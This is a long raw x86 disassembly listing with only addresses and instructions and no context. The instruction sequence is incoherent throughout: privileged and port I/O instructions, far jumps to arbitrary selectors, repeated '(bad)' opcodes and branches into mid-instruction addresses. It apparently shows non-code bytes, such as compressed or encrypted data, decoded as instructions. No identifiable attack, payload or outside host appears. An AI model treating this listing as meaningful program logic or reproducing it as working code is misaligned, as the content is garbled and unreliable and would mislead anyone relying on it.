  431c1c:	jge    0x431bbe
  431c1e:	and    ch,bl
  431c20:	mov    al,0x9f
  431c22:	out    dx,eax
  431c23:	add    BYTE PTR [ecx],bh
  431c25:	dec    ebp
  431c26:	xor    eax,ecx
  431c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431c29:	icebp  
  431c2a:	jle    0x431c15
  431c2c:	adc    eax,0x2aa0d67d
  431c31:	xor    ch,bh
  431c33:	and    esp,edi
  431c35:	ror    BYTE PTR [eax-0x2a],cl
  431c38:	push   esp
  431c39:	add    ebp,ecx
  431c3b:	adc    esi,ebp
  431c3d:	loopne 0x431c72
  431c3f:	dec    esi
  431c40:	sub    al,0x86
  431c42:	xor    eax,0xbb59c15b
  431c47:	ins    BYTE PTR es:[edi],dx
  431c48:	pop    ebp
  431c49:	jecxz  0x431c7c
  431c4b:	xchg   esp,eax
  431c4c:	pop    ds
  431c4d:	and    al,BYTE PTR [esi-0x35]
  431c50:	mov    ds:0x8688ee4c,al
  431c55:	cli    
  431c56:	arpl   WORD PTR [edx+0x35],di
  431c59:	push   ebp
  431c5a:	out    0xa0,al
  431c5c:	jg     0x431c85
  431c5e:	ja     0x431cd1
  431c60:	dec    esi
  431c61:	mov    BYTE PTR [esi-0x111c16e3],dl
  431c67:	xchg   edi,eax
  431c68:	pop    ebx
  431c69:	sub    ch,BYTE PTR [ebp-0x51]
  431c6c:	fadd   DWORD PTR [esi]
  431c6e:	test   al,0xa0
  431c70:	pop    esp
  431c71:	clc    
  431c72:	and    ah,0x10
  431c75:	or     al,0xb0
  431c77:	xlat   BYTE PTR ds:[ebx]
  431c78:	pop    esi
  431c79:	cmp    al,0x6f
  431c7b:	addr16 push ebp
  431c7d:	loop   0x431c06
  431c7f:	adc    al,0x86
  431c81:	pusha  
  431c82:	repz repz add ebp,edi
  431c86:	div    DWORD PTR [edx+esi*8+0x63]
  431c8a:	bound  esp,QWORD PTR [edi-0x5c2afba2]
  431c90:	mov    bh,0x76
  431c92:	push   esp
  431c93:	sbb    eax,esp
  431c95:	pusha  
  431c96:	xor    al,0x4
  431c98:	loop   0x431cff
  431c9a:	xchg   ebp,eax
  431c9b:	xor    eax,0x15002e7a
  431ca0:	out    dx,eax
  431ca1:	push   ecx
  431ca2:	outs   dx,BYTE PTR ds:[esi]
  431ca3:	(bad)  
  431ca4:	mov    eax,0xbc626b34
  431ca9:	pusha  
  431caa:	shr    BYTE PTR [eax+0x18356043],0x3d
  431cb1:	mov    edx,0xaf5ec14a
  431cb6:	ret    
  431cb7:	loop   0x431ce7
  431cb9:	iret   
  431cba:	mov    al,ds:0x50612a16
  431cbf:	mov    es,WORD PTR [ebx+edx*8]
  431cc2:	jne    0x431d2c
  431cc4:	data16 icebp 
  431cc6:	out    dx,al
  431cc7:	mov    DWORD PTR [esi+0x4bc16238],esi
  431ccd:	in     al,0x67
  431ccf:	xchg   ebx,eax
  431cd0:	ja     0x431cc7
  431cd2:	jns    0x431c75
  431cd4:	int3   
  431cd5:	vmread DWORD PTR [edi],ebx
  431cd8:	call   0x3813813a
  431cdd:	adc    ah,bh
  431cdf:	sub    ah,BYTE PTR [ebx-0x1f]
  431ce2:	ret    
  431ce3:	lock retf 0xa597
  431ce7:	add    eax,0xe985530b
  431cec:	jl     0x431ce4
  431cee:	dec    esi
  431cef:	lahf   
  431cf0:	adc    al,0xfe
  431cf2:	or     DWORD PTR [eax-0x7a98d3a2],ebx
  431cf8:	inc    eax
  431cf9:	xchg   DWORD PTR [ebx+0x5a51d1b1],edi
  431cff:	add    cl,BYTE PTR [esi+eiz*8]
  431d02:	cs jmp 0xa5b119cf
  431d08:	fs ins DWORD PTR es:[edi],dx
  431d0a:	outs   dx,BYTE PTR ds:[esi]
  431d0b:	pop    es
  431d0c:	jmp    DWORD PTR [eax-0x76549eb9]
  431d12:	lea    esp,[edx-0xc209267]
  431d18:	je     0x431d40
  431d1a:	xor    DWORD PTR [ebp+0x17],ebp
  431d1d:	pop    esi
  431d1e:	out    dx,al
  431d1f:	fist   WORD PTR [edi+0x30]
  431d22:	sar    dl,0xe7
  431d25:	adc    al,0x3d
  431d27:	mov    ds:0x33f0f38,al
  431d2c:	into   
  431d2d:	pmaxub mm1,QWORD PTR [eax+0xe]
  431d31:	xchg   ebx,eax
  431d32:	out    dx,al
  431d33:	hlt    
  431d34:	ins    BYTE PTR es:[edi],dx
  431d35:	adc    al,BYTE PTR [esi-0x7e943c37]
  431d3b:	test   al,0x82
  431d3d:	(bad)  
  431d3e:	out    dx,eax
  431d3f:	pop    ebx
  431d40:	not    BYTE PTR [eax+0x54]
  431d43:	xor    DWORD PTR [edx+eiz*2],edx
  431d46:	out    dx,al
  431d47:	jle    0x431d20
  431d49:	pop    esi
  431d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d4b:	pop    eax
  431d4c:	push   ecx
  431d4e:	mov    edi,0xe81816a0
  431d53:	ins    DWORD PTR es:[edi],dx
  431d54:	inc    ecx
  431d55:	inc    ecx
  431d56:	mov    esi,0xbcb95eb6
  431d5b:	jp     0x431db0
  431d5d:	xchg   BYTE PTR [edx+0x2a52e3de],cl
  431d63:	or     BYTE PTR [edx-0x44],ah
  431d66:	sub    ecx,DWORD PTR [ecx+0x3d66b3eb]
  431d6c:	and    al,0x3b
  431d6e:	fstp   TBYTE PTR [edi]
  431d70:	aaa    
  431d71:	push   es
  431d72:	mov    esi,0xcd51af23
  431d77:	fs dec ecx
  431d79:	add    DWORD PTR [edi+ecx*4-0x6dda9f63],ecx
  431d80:	mul    DWORD PTR [edi]
  431d82:	push   edi
  431d83:	adc    DWORD PTR ds:0x55a1fbfc,esp
  431d89:	xor    ebx,ebp
  431d8b:	inc    esp
  431d8c:	cs push edi
  431d8e:	pop    ss
  431d8f:	adc    esi,esp
  431d91:	fs lahf 
  431d93:	xchg   ebx,eax
  431d94:	adc    ch,bh
  431d96:	nop
  431d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d98:	fisttp WORD PTR [esi]
  431d9a:	xor    BYTE PTR [ebp-0x4a],ch
  431d9d:	repz addr16 (bad) 
  431da0:	addr16 mov eax,0xde602380
  431da6:	cmp    al,0x67
  431da8:	jns    0x431da9
  431daa:	pop    esi
  431dab:	ja     0x431deb
  431dad:	push   0xffffffbf
  431daf:	mov    al,ds:0xc64922f
  431db4:	loop   0x431e0e
  431db6:	add    ebx,esi
  431db8:	fst    DWORD PTR fs:[ebx+0x34]
  431dbc:	outs   dx,BYTE PTR ds:[esi]
  431dbd:	jg     0x431e21
  431dbf:	dec    edx
  431dc0:	idiv   BYTE PTR [edx]
  431dc2:	inc    edx
  431dc3:	inc    ecx
  431dc4:	or     ah,BYTE PTR [ecx+0x2b]
  431dc7:	or     eax,0x2eb49d4
  431dcc:	mov    ds:0xb72d25ab,eax
  431dd1:	pusha  
  431dd2:	fdiv   DWORD PTR [edx+0x6aa6f962]
  431dd8:	sbb    ah,BYTE PTR [ecx-0x7d]
  431ddb:	jnp    0x431de1
  431ddd:	loop   0x431dcf
  431ddf:	(bad)  
  431de0:	fidivr WORD PTR [eax-0x12]
  431de3:	sbb    ebp,DWORD PTR [esi-0x7b]
  431de6:	loop   0x431e5d
  431de8:	cld    
  431de9:	scas   al,BYTE PTR es:[edi]
  431dea:	lods   al,BYTE PTR ds:[esi]
  431deb:	mov    al,ds:0x9800ef5d
  431df0:	jb     0x431e06
  431df2:	adc    al,0x19
  431df4:	pop    esi
  431df5:	pop    edx
  431df6:	and    esp,DWORD PTR [ebp-0x9]
  431df9:	sbb    cl,BYTE PTR [edi+0x38715c96]
  431dff:	adc    DWORD PTR [edx+0xd],ebx
  431e02:	fbld   TBYTE PTR [ebx-0x41d167a2]
  431e08:	scas   al,BYTE PTR es:[edi]
  431e09:	neg    BYTE PTR [ebx]
  431e0b:	sbb    BYTE PTR [eax+0x6d8de7b8],0x4e
  431e12:	push   edx
  431e13:	dec    edi
  431e14:	lods   eax,DWORD PTR ds:[esi]
  431e15:	mov    al,ds:0x5777a22d
  431e1a:	jg     0x431dfc
  431e1c:	pop    ebp
  431e1d:	in     eax,dx
  431e1e:	aad    0x21
  431e20:	fcmovne st,st(5)
  431e22:	ss iret 
  431e24:	out    dx,al
  431e25:	sub    bh,0xaf
  431e28:	in     al,dx
  431e29:	jns    0x431e99
  431e2b:	dec    ebx
  431e2c:	pop    es
  431e2d:	rcl    DWORD PTR [edi-0x11ce3c0b],0x70
  431e34:	fstp   DWORD PTR [ebx]
  431e36:	pop    esp
  431e37:	ja     0x431e59
  431e39:	mov    edx,0x6f68a0db
  431e3e:	jne    0x431e21
  431e40:	out    dx,al
  431e41:	cmp    ebx,DWORD PTR [edx-0x2a]
  431e44:	jmp    0xdde8:0xda66eeb7
  431e4b:	push   edi
  431e4c:	dec    edi
  431e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431e4e:	imul   esp,DWORD PTR [ecx-0x6447a516],0x21dc06f5
  431e58:	ss or  eax,0x8104a114
  431e5e:	aas    
  431e5f:	ja     0x431e44
  431e61:	lds    edx,FWORD PTR [esi]
  431e63:	test   DWORD PTR [edx-0x7a22dda3],0x6e57a89d
  431e6d:	clc    
  431e6e:	mov    dh,0x4b
  431e70:	pop    ebp
  431e71:	sub    DWORD PTR [esp+esi*1],edx
  431e74:	add    BYTE PTR [eax],al
  431e76:	jmp    0x431e37
  431e78:	xchg   edx,eax
  431e79:	jo     0x431e13
  431e7b:	lahf   
  431e7c:	arpl   WORD PTR [eax-0xe19025],bx
  431e82:	ja     0x431e5b
  431e84:	lods   eax,DWORD PTR ds:[esi]
  431e85:	adc    ch,ch
  431e87:	xor    al,0xe9
  431e89:	add    eax,0xb8342dc5
  431e8e:	push   ds
  431e8f:	into   
  431e90:	enter  0x160,0x5f
  431e94:	sbb    eax,0x5aa7453e
  431e99:	fcomp  QWORD PTR [ebx]
  431e9b:	popa   
  431e9c:	push   edi
  431e9d:	adc    eax,0x1323216e
  431ea2:	rol    BYTE PTR [esi-0x5e5fd703],1
  431ea8:	mov    cl,ch
  431eaa:	mov    WORD PTR [ebp+0x15],es
  431ead:	pop    edx
  431eae:	imul   BYTE PTR [ebp+ebx*2+0xf]
  431eb2:	cmp    al,0x66
  431eb4:	iret   
  431eb5:	fldpi  
  431eb7:	jo     0x431e4f
  431eb9:	cmp    al,0xa5
  431ebb:	mov    eax,ds:0x33cec356
  431ec0:	adc    ah,BYTE PTR [edx-0x7c]
  431ec3:	add    al,0x5e
  431ec5:	lds    edx,FWORD PTR [esi-0x69]
  431ec8:	pushf  
  431ec9:	xchg   esp,eax
  431eca:	rcr    BYTE PTR [edx+0x7d8e6137],0xd4
  431ed1:	xchg   ebx,eax
  431ed2:	push   ds
  431ed3:	and    DWORD PTR [esi+0x58],ecx
  431ed6:	out    0xd7,eax
  431ed8:	lods   al,BYTE PTR ds:[esi]
  431ed9:	cmc    
  431eda:	cdq    
  431edb:	sbb    edi,DWORD PTR [ecx+0x4f]
  431ede:	cmp    edx,DWORD PTR cs:[ecx+0x44a160d4]
  431ee5:	into   
  431ee6:	aaa    
  431ee7:	dec    ebx
  431ee8:	and    bh,cl
  431eea:	cmp    ebp,DWORD PTR ds:0x1ea445e
  431ef0:	popa   
  431ef1:	scas   al,BYTE PTR es:[edi]
  431ef2:	push   esp
  431ef3:	mov    ecx,0xc135619d
  431ef8:	fiadd  WORD PTR [esi+eiz*8+0x3a]
  431efc:	loopne 0x431ee0
  431efe:	mov    ecx,0x45e05b27
  431f03:	dec    esi
  431f04:	xlat   BYTE PTR ds:[ebx]
  431f05:	jo     0x431ef4
  431f07:	cli    
  431f08:	fnstenv [ebp+0x532fa02e]
  431f0e:	scas   eax,DWORD PTR es:[edi]
  431f0f:	test   eax,0x918e3d7d
  431f14:	dec    eax
  431f15:	jmp    0x431f20
  431f17:	pop    ss
  431f18:	pop    esi
  431f19:	bound  edx,QWORD PTR [esi]
  431f1b:	test   al,0x81
  431f1d:	(bad)  
  431f1e:	and    al,0xb3
  431f20:	xor    al,0xbf
  431f22:	push   edi
  431f23:	(bad)  
  431f24:	mov    ch,0xbc
  431f26:	sub    eax,0xaeb691e1
  431f2b:	add    al,0x2f
  431f2d:	xchg   bl,dh
  431f2f:	adc    DWORD PTR [ecx+eiz*4-0x1],ebp
  431f33:	mov    al,ds:0x41033f40
  431f38:	fistp  WORD PTR [ebp-0x7e]
  431f3b:	popf   
  431f3c:	push   ebp
  431f3d:	xchg   edi,eax
  431f3e:	cmp    eax,0x9d8de614
  431f43:	jmp    0xa9bc:0x34a8ee5e
  431f4a:	mov    eax,ds:0x4a60aec5
  431f4f:	and    BYTE PTR [esi],cl
  431f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f52:	sub    al,0x33
  431f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f55:	icebp  
  431f56:	out    dx,al
  431f57:	cld    
  431f58:	or     edx,DWORD PTR [eax]
  431f5a:	loopne 0x431fb3
  431f5c:	sub    BYTE PTR [ebp+ebx*4-0x66873f61],ch
  431f63:	test   al,0x1b
  431f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431f66:	pop    ds
  431f67:	ret    
  431f68:	mov    eax,ds:0xd16a2eb5
  431f6d:	adc    eax,0xf16845ff
  431f72:	out    dx,al
  431f73:	in     al,0xf9
  431f75:	and    al,bl
  431f77:	push   esi
  431f78:	mov    dh,0x60
  431f7a:	int    0xf4
  431f7c:	jbe    0x431efe
  431f7e:	into   
  431f7f:	fwait
  431f80:	jns    0x431f1b
  431f82:	out    dx,al
  431f83:	imul   DWORD PTR [ebx-0x4c]
  431f86:	xor    al,0x60
  431f88:	lods   eax,DWORD PTR ds:[esi]
  431f89:	push   cs
  431f8a:	sbb    ah,BYTE PTR [ebp+edx*4-0x2f59c461]
  431f91:	hlt    
  431f92:	pop    esp
  431f93:	push   ebp
  431f94:	sahf   
  431f95:	pop    ecx
  431f96:	loop   0x431f5c
  431f98:	pop    ebp
  431f99:	cdq    
  431f9a:	xchg   BYTE PTR [eax+0x6a],ch
  431f9d:	in     al,dx
  431f9e:	push   ebp
  431f9f:	icebp  
  431fa0:	out    dx,al
  431fa1:	imul   ecx,esi,0x228c0da0
  431fa7:	or     BYTE PTR [edi+ecx*1-0x16],bl
  431fab:	rcr    BYTE PTR [esi+0x16],1
  431fae:	cmp    al,0x86
  431fb0:	ficom  DWORD PTR [eax-0x6b]
  431fb3:	mov    DWORD PTR [ebx+0x378b2e60],ebp
  431fb9:	aaa    
  431fba:	inc    edx
  431fbb:	ds enter 0xee11,0xf6
  431fc0:	neg    BYTE PTR [ecx+0x53a6a60a]
  431fc6:	jae    0x431f69
  431fc8:	mov    al,ds:0xcf8c8026
  431fcd:	ins    DWORD PTR es:[edi],dx
  431fce:	adc    esi,edx
  431fd0:	pop    esi
  431fd1:	jle    0x431f5f
  431fd3:	cmp    eax,0xf5935ccc
  431fd8:	call   0x1396:0xcad45160
  431fdf:	xchg   edx,edx
  431fe1:	mov    esi,gs
  431fe3:	or     DWORD PTR [eax-0x2c],eax
  431fe6:	arpl   WORD PTR [edi+0x2b],bx
  431fe9:	push   esi
  431fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431feb:	mov    ds:0x87e6a305,al
  431ff0:	stc    
  431ff1:	mov    dh,0x64
  431ff3:	ins    DWORD PTR es:[edi],dx
  431ff4:	cdq    
  431ff5:	imul   ebp,esi,0x21
  431ff8:	(bad)  
  431ff9:	jp     0x43204b
  431ffb:	pop    ss
  431ffc:	push   0x2da5375d
  432001:	jns    0x432009
  432003:	mov    ds:0x9e8ea12b,al
  432008:	sti    
  432009:	inc    edx
  43200a:	out    dx,al
  43200b:	je     0x43201c
  43200d:	aas    
  43200e:	cmp    BYTE PTR [eax],0x5b
  432011:	sar    BYTE PTR [ebp+0x11],0x1d
  432015:	pusha  
  432016:	dec    eax
  432017:	out    0x88,eax
  432019:	mov    esi,ds
  43201b:	in     eax,dx
  43201c:	sbb    esi,DWORD PTR [ebp+0x515fc961]
  432022:	mov    DWORD PTR [edx+0x30f26a26],edi
  432028:	push   ebp
  432029:	cmp    eax,0x1dcea190
  43202e:	iret   
  43202f:	jle    0x43209e
  432031:	jne    0x431fe0
  432033:	or     eax,0xc1df5354
  432038:	sahf   
  432039:	out    0xac,eax
  43203b:	mov    bh,0x35
  43203d:	xor    esi,ebx
  43203f:	enter  0xf66c,0xee
  432043:	pop    edx
  432044:	push   cs
  432045:	aad    0x9f
  432047:	sahf   
  432048:	fst    st(1)
  43204a:	out    dx,al
  43204b:	adc    DWORD PTR [ebx+0x3ab3f450],edi
  432051:	push   ss
  432052:	int    0x78
  432054:	ficomp WORD PTR [edi-0x43]
  432057:	inc    edx
  432058:	or     al,0xb5
  43205a:	in     al,dx
  43205b:	mov    bl,bl
  43205d:	test   eax,0x8df2f167
  432062:	or     ch,0x5e
  432065:	push   0x74
  432067:	mov    bh,0xfe
  432069:	lds    edi,FWORD PTR [edx+0x485975d8]
  43206f:	addr16 out 0x17,al
  432072:	pop    edx
  432073:	add    esp,ecx
  432075:	sti    
  432076:	jl     0x432086
  432078:	mul    eax
  43207a:	dec    edx
  43207b:	or     BYTE PTR ds:0x8c1ec06e,dh
  432081:	jmp    0x12ce:0x6766279
  432088:	mov    fs,esi
  43208a:	xlat   BYTE PTR ds:[ebx]
  43208b:	sahf   
  43208c:	mov    esp,0xdeb929f5
  432091:	jmp    0x4320c2
  432093:	iret   
  432094:	fidiv  DWORD PTR [ebx-0x59888714]
  43209a:	and    ebx,eax
  43209c:	shl    BYTE PTR [eax],1
  43209e:	xchg   edi,eax
  43209f:	mov    al,ds:0x1d9f6052
  4320a4:	mov    WORD PTR [ecx+0x705c41e3],cs
  4320aa:	(bad)  
  4320ab:	mov    edx,0xf3d9766e
  4320b0:	mov    ecx,0x55f14e60
  4320b5:	sbb    cl,dl
  4320b7:	lods   al,BYTE PTR ds:[esi]
  4320b8:	fidivr DWORD PTR [edx-0x13]
  4320bb:	cmp    ah,BYTE PTR [ecx+edx*1+0x65]
  4320bf:	or     DWORD PTR [edi],0x7c
  4320c2:	bound  edx,QWORD PTR [ebx-0x5e71d6f9]
  4320c8:	dec    DWORD PTR [esi+0x449b62db]
  4320ce:	push   ecx
  4320cf:	inc    ebp
  4320d0:	pop    esi
  4320d1:	jns    0x432084
  4320d3:	mov    ebx,0x41fdf7fd
  4320d8:	push   ds
  4320d9:	popa   
  4320da:	jmp    0x1a1758dc
  4320df:	fs xchg edi,eax
  4320e1:	jmp    0x4320c9
  4320e3:	and    DWORD PTR [esi],esp
  4320e5:	pop    eax
  4320e6:	inc    edi
  4320e7:	mov    eax,ds:0x25bc1a4
  4320ec:	shl    bh,cl
  4320ee:	xor    eax,0xe9041c94
  4320f3:	mov    al,ds:0x1e1ca097
  4320f8:	dec    esp
  4320f9:	in     al,0xee
  4320fb:	jle    0x43210a
  4320fd:	out    0xcd,al
  4320ff:	cdq    
  432100:	fdiv   QWORD PTR [ebx+0x60f07eaf]
  432106:	(bad)  [edi-0x3fdd7784]
  43210c:	cmp    edi,ebp
  43210e:	out    dx,al
  43210f:	pop    edi
  432110:	xlat   BYTE PTR ds:[ebx]
  432111:	lods   al,BYTE PTR ds:[esi]
  432112:	rcr    DWORD PTR [edx-0x1d],0xee
  432116:	jp     0x4320a6
  432118:	(bad)  
  432119:	scas   al,BYTE PTR es:[edi]
  43211a:	mov    eax,ds:0x7fb85e1
  43211f:	mov    BYTE PTR [edx-0x4504117e],ah
  432125:	(bad)  
  432126:	cmp    eax,0xd1b6d2b1
  43212b:	mov    al,ds:0x561508ff
  432130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432131:	fisubr DWORD PTR [ebp-0x736aa1dc]
  432137:	xchg   ebp,eax
  432138:	jae    0x432107
  43213a:	fcmovb st,st(5)
  43213c:	fstp   DWORD PTR [ebp+0x2a]
  43213f:	(bad)  
  432140:	lock pop es
  432142:	mov    ebx,0xa0c07658
  432147:	mov    ds,WORD PTR [esi+0x28]
  43214a:	jmp    0xd15c06c5
  43214f:	xlat   BYTE PTR ds:[ebx]
  432150:	inc    edi
  432151:	inc    ebp
  432152:	xchg   DWORD PTR [ebx],edx
  432154:	loope  0x432176
  432156:	out    0xe4,al
  432158:	in     al,0x7b
  43215a:	loopne 0x4320df
  43215c:	pop    esi
  43215d:	cwde   
  43215e:	or     al,0xa6
  432160:	stc    
  432161:	mov    DWORD PTR [edi-0x5e],0x30fc601e
  432168:	(bad)  
  432169:	cmc    
  43216a:	popa   
  43216b:	jno    0x43214c
  43216d:	mov    al,0xf3
  43216f:	in     eax,0x5e
  432171:	adc    bl,BYTE PTR [ebp-0x30]
  432174:	jecxz  0x4321a1
  432176:	aaa    
  432177:	rcr    DWORD PTR [edx+eiz*2-0x67],1
  43217b:	push   ebx
  43217c:	xor    BYTE PTR fs:[ebx+0x288b3e2e],bl
  432183:	mov    edi,0x4235e45
  432188:	mov    ebx,ecx
  43218a:	sbb    al,0x6e
  43218c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43218d:	imul   ebx,DWORD PTR [esi],0x55e7f12b
  432193:	lods   eax,DWORD PTR ds:[esi]
  432194:	xchg   esp,eax
  432195:	dec    ebp
  432196:	out    dx,al
  432197:	bnd jmp 0xef2ae2d0
  43219d:	cmp    dh,ch
  43219f:	stos   BYTE PTR es:[edi],al
  4321a0:	cs pop eax
  4321a2:	stos   DWORD PTR es:[edi],eax
  4321a3:	sbb    BYTE PTR fs:[ebp-0xcf15ef5],0x18
  4321ab:	and    DWORD PTR [edi+0x2e],ebp
  4321ae:	lods   al,BYTE PTR ds:[esi]
  4321af:	mov    ds:0x20e1c438,eax
  4321b4:	dec    ebp
  4321b5:	push   ebp
  4321b6:	push   ebx
  4321b7:	jg     0x43215e
  4321b9:	mov    DWORD PTR [edx-0x7fc0471],edx
  4321bf:	and    DWORD PTR [edx-0x42],eax
  4321c2:	call   0x85a0:0xaeb33894
  4321c9:	push   edi
  4321ca:	out    dx,al
  4321cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4321cc:	xchg   DWORD PTR [ebp+ecx*4-0x2d],esp
  4321d0:	push   eax
  4321d1:	(bad)  
  4321d2:	out    0xa0,al
  4321d4:	(bad)  
  4321d5:	iret   
  4321d6:	add    al,0x27
  4321d8:	jb     0x4321ef
  4321da:	dec    ecx
  4321db:	outs   dx,BYTE PTR ds:[esi]
  4321dc:	pop    esi
  4321dd:	inc    esi
  4321de:	mov    dl,0x25
  4321e0:	call   0x841b7d04
  4321e5:	pusha  
  4321e6:	pop    ds
  4321e7:	dec    ebx
  4321e8:	mov    ebx,0xe346ef87
  4321ed:	cmp    ch,dh
  4321ef:	xchg   edx,eax
  4321f0:	pop    ecx
  4321f1:	repz mov al,ds:0xeb114dde
  4321f7:	mov    al,ds:0x96cec434
  4321fc:	outs   dx,BYTE PTR ds:[esi]
  4321fd:	in     al,0x2a
  4321ff:	mov    al,0x5e
  432201:	fiadd  WORD PTR ds:0x6cb9de70
  432207:	call   0xcbbd82d2
  43220c:	(bad)  
  43220d:	std    
  43220e:	jecxz  0x43224d
  432210:	in     al,dx
  432211:	jge    0x432201
  432213:	lock push ds
  432215:	cmp    bh,BYTE PTR [edi+0x9d1508c]
  43221b:	mov    eax,ds:0xa5fb59d5
  432220:	mov    eax,gs:0x345e6c49
  432226:	aad    0x3d
  432228:	mov    dl,0x9b
  43222a:	test   eax,0x860e215
  43222f:	cmp    ah,ah
  432231:	ss push cs
  432233:	in     al,dx
  432234:	push   0x27
  432236:	out    dx,al
  432237:	pop    eax
  432238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432239:	imul   ebx,ecx,0xffffff9b
  43223c:	dec    esi
  43223d:	and    al,0x7d
  43223f:	mov    eax,ds:0x43c6f232
  432244:	push   ebp
  432245:	hlt    
  432246:	push   ecx
  432247:	sbb    eax,0xdd28a85b
  43224c:	sbb    dl,BYTE PTR [ebp-0x42392c42]
  432252:	out    0x9e,eax
  432254:	dec    ebx
  432255:	push   ds
  432256:	dec    esi
  432257:	pop    ebx
  432258:	push   ds
  432259:	in     eax,dx
  43225a:	xchg   edx,eax
  43225b:	ds xchg edi,eax
  43225d:	push   ecx
  43225e:	out    dx,al
  43225f:	cmc    
  432260:	(bad)
  432264:	inc    esi
  432265:	mov    dl,0x2
  432267:	mov    eax,ds:0xb3459447
  43226c:	les    esi,FWORD PTR [eax]
  43226e:	jmp    0x432245
  432270:	pop    ebx
  432271:	cmp    BYTE PTR [edx-0x51c4b620],ch
  432277:	push   ebx
  432278:	cmp    eax,0xb7a0e612
  43227d:	mov    ah,0x74
  43227f:	xchg   edx,eax
  432280:	mov    al,ds:0x518dc2e3
  432285:	push   0x29b4c0f3
  43228a:	out    dx,al
  43228b:	enter  0x8f56,0x56
  43228f:	call   DWORD PTR [eax+edi*8+0x609c84ef]
  432296:	mov    cl,0xbc
  432298:	inc    esi
  432299:	call   0x40ed:0xd90a44ae
  4322a0:	xor    eax,0x19c0ffe5
  4322a5:	rcr    dh,cl
  4322a7:	mov    esi,0x91f76082
  4322ac:	test   eax,0xb905ba89
  4322b1:	das    
  4322b2:	into   
  4322b3:	cwde   
  4322b4:	xchg   dl,al
  4322b6:	xchg   DWORD PTR [ebx],eax
  4322b8:	xchg   ebp,eax
  4322b9:	pop    ebp
  4322ba:	shl    BYTE PTR [ebx+0x6],cl
  4322bd:	ss and eax,0x35e0db73
  4322c3:	pop    esp
  4322c4:	push   edi
  4322c5:	mov    edx,eax
  4322c7:	shl    DWORD PTR [ebp+eax*2+0x4],1
  4322cb:	sub    bl,BYTE PTR [esi-0x2cd0822b]
  4322d1:	adc    eax,0xc61ea0ec
  4322d6:	or     al,ch
  4322d8:	ss xor al,0xad
  4322db:	sahf   
  4322dc:	push   ebx
  4322dd:	sub    ecx,edi
  4322df:	add    al,0x5a
  4322e1:	retf   
  4322e2:	(bad)  
  4322e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322e4:	fild   WORD PTR [ebx]
  4322e6:	inc    ebp
  4322e7:	pop    ecx
  4322e8:	or     ecx,DWORD PTR [edx-0x64a365a4]
  4322ee:	or     eax,0x4db45f70
  4322f3:	scas   al,BYTE PTR es:[edi]
  4322f4:	fidivr WORD PTR [edi]
  4322f6:	and    al,0x62
  4322f8:	arpl   WORD PTR [edi+0x409abab8],bx
  4322fe:	fucom  st(2)
  432300:	mov    dh,0x1
  432302:	mov    ds:0x6564cea1,al
  432307:	sbb    eax,0x9a0a0c23
  43230c:	arpl   WORD PTR [ecx],bp
  43230e:	dec    ebx
  43230f:	into   
  432310:	push   edi
  432311:	inc    ecx
  432312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432313:	add    BYTE PTR [edx],bl
  432315:	fbld   TBYTE PTR [ecx+eiz*4-0x4c]
  432319:	out    0x1a,al
  43231b:	js     0x4322e0
  43231d:	mov    ecx,DWORD PTR [ebx-0x5da7a1bf]
  432323:	mov    ecx,0x4f1b590a
  432328:	and    eax,0x9ae25575
  43232d:	pusha  
  43232e:	pop    ecx
  43232f:	and    DWORD PTR [ebp+0x6c],eax
  432332:	es rdtsc 
  432335:	repz push esi
  432337:	mov    eax,ds:0x6cd32c2c
  43233c:	aaa    
  43233d:	ficom  WORD PTR [ecx+ebp*2]
  432340:	xchg   DWORD PTR [ebp-0x3d],ebx
  432343:	add    ch,dl
  432345:	cmp    al,0xdd
  432347:	fcomp  QWORD PTR [esi-0x5]
  43234a:	or     esi,DWORD PTR [ebx]
  43234c:	mov    ch,BYTE PTR [ebx]
  43234e:	push   0x27
  432350:	inc    ebp
  432351:	popa   
  432352:	mov    DWORD PTR [eax-0x4a],ebp
  432355:	out    0x1b,al
  432357:	aaa    
  432358:	repnz push esp
  43235a:	and    BYTE PTR [esi+0x28],ah
  43235d:	mov    ds:0xdac6e0ee,al
  432362:	jle    0x432374
  432364:	fcmovnbe st,st(7)
  432366:	daa    
  432367:	mov    eax,ds:0x16e1282c
  43236c:	repnz dec ecx
  43236e:	mov    dh,0x70
  432370:	sbb    BYTE PTR [ebp-0x62],dh
  432373:	stos   DWORD PTR es:[edi],eax
  432374:	xor    DWORD PTR [ecx+0x41],esp
  432377:	xchg   ebx,eax
  432378:	fiadd  DWORD PTR [ebp-0x4b]
  43237b:	sub    bh,bh
  43237d:	dec    edx
  43237e:	out    dx,al
  43237f:	cdq    
  432380:	xor    al,0x88
  432382:	push   ecx
  432383:	sbb    ecx,esp
  432385:	jns    0x432361
  432387:	mov    al,ds:0xb942ae7e
  43238c:	mov    ds:0x5fc993d0,al
  432391:	pushf  
  432392:	and    ecx,DWORD PTR [esi+0x58e21fa8]
  432398:	pop    edx
  432399:	add    eax,0xe11aa2ef
  43239e:	mov    esi,0xad67f500
  4323a3:	test   BYTE PTR [ecx],dh
  4323a5:	mov    al,0xc6
  4323a7:	fs in  al,0x21
  4323aa:	out    dx,al
  4323ab:	scas   al,BYTE PTR es:[edi]
  4323ac:	jle    0x43239f
  4323ae:	shr    ebx,1
  4323b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4323b1:	sub    bh,BYTE PTR [ecx+eiz*4]
  4323b4:	bound  esi,QWORD PTR [eax+0x364f9c48]
  4323ba:	push   0x7b
  4323bc:	push   esp
  4323bd:	add    al,0x9b
  4323bf:	pop    edx
  4323c0:	sahf   
  4323c1:	push   es
  4323c2:	ficomp DWORD PTR [edx*2+0x5ca1539a]
  4323c9:	jle    0x4323f8
  4323cb:	push   es
  4323cc:	cli    
